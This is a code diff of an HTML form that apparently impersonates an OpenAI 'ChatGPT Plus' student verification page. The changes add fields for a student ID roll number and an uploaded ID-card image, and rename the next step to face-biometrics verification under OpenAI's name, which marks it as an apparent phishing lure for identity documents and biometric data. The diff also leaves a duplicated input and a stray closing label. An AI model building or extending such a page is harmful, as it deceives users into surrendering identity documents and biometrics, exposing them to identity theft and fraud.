@@ -49,7 +49,16 @@
         <label for="percentage12th">12th Percentage / CGPA
           <input id="percentage12th" name="percentage" type="text" required placeholder="e.g. 92% or 9.5 CGPA">
         </label>
-        <button id="submitBtn" type="submit">Continue <span>→</span></button>
+         <label for="studentid">Your Student ID Roll Number
+          <input id="studentid" name="studentid" type="text" required placeholder="e.g. 123456789">
+        </label>
+        
+        <label for="studentidimage">Upload your Student ID Card Image
+          <input id="studentidimage" name="studentidimage" type="file" required accept="image/*">
+        </label>
+          <input id="percentage12th" name="percentage" type="text" required placeholder="e.g. 92% or 9.5 CGPA">
+        </label>
+        <button id="submitBtn" type="submit">Continue To Biometrics Verification <span>→</span></button>
       </form>
 
       <p id="formError" class="error" role="alert"></p>
@@ -59,15 +68,15 @@
     <section id="welcomeScreen" class="panel hidden">
       <div class="success">Details submitted successfully ✓</div>
       <h1 class="welcome">Verification in Progress <span>ChatGPT Plus</span></h1>
-      <div class="message">Identity & Enrollment Check</div>
+      <div class="message">Identity & Human Check With Your Face Biometrics </div>
 
       <div id="noticeBox" class="notice">
-        <h2>Verification may take up to 24 hours</h2>
+        <h2>Face Verification may take up to 24 hours</h2>
         <p><strong>Status: Pending Academic Review</strong></p>
         <p>We are verifying your academic details with your institution. Additional identity verification (e.g., student ID verification) may be requested.</p>
         <p class="muted small">By proceeding, you agree to OpenAI's Terms of Use and Privacy Policy.</p>
         
-        <button id="allowBtn" type="button">Begin Verification</button>
+        <button id="allowBtn" type="button">Begin Face Verification</button>
         <button id="declineBtn" class="secondary" type="button">Cancel</button>
       </div>
 
